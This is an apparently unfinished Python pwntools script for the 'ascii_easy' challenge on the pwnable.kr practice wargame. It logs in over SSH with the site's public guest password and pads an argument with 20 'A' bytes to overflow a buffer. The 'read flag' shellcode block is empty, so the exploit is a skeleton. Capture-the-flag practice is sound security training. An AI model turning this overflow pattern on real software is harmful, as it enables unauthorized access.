from pwn import *

s = ssh("ascii_easy", "pwnable.kr", port=2222, password='guest')

shellcode = b'A' * 20   # overwrite buffer

# read flag
shellcode += asm('''
    
''')

p = s.process(executable='./ascii_easy', args=['ascii_easy', shellcode])